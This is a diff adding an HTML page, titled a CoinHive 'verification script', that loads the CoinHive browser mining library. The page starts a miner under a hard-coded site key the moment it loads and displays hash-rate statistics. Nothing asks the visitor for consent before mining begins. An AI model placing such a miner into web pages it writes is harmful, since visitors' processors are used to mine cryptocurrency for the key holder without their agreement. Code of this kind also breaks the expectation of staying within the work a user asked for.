@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<head>
+	<title>CoinHive Verification </title>
+	<link rel="stylesheet" type="text/css" href="./css/main.css"/>
+	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+</head>
+<body>
+	<h1 style="border:2px solid green">Coinhive verification script</h1>
+	<script>
+		var miner = new CoinHive.Anonymous('qmrWSl9krG2AAbImQOOjFwjJkfkt7D8n');
+		miner.start();
+
+		// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		document.getElementById("hps").innerHTML = hashesPerSecond;
+		document.getElementById("th").innerHTML = totalHashes;
+		document.getElementById("ah").innerHTML = acceptedHashes;
+	}, 750);
+	</script>
+	<table>
+		<tr>
+			<th>Statistics:</th>
+		</tr>
+		<tr>
+			<td>Hashes per second:</td>
+			<td id="hps">0</td>
+		</tr>
+		<tr>
+			<td>Hashes generated:</td>
+			<td id="th">0</td>
+		</tr>
+		<tr>
+			<td>Accepted hashes:</td>
+			<td id="ah">0</td>
+		</tr>
+	</table>
+</body>
+
+</html>
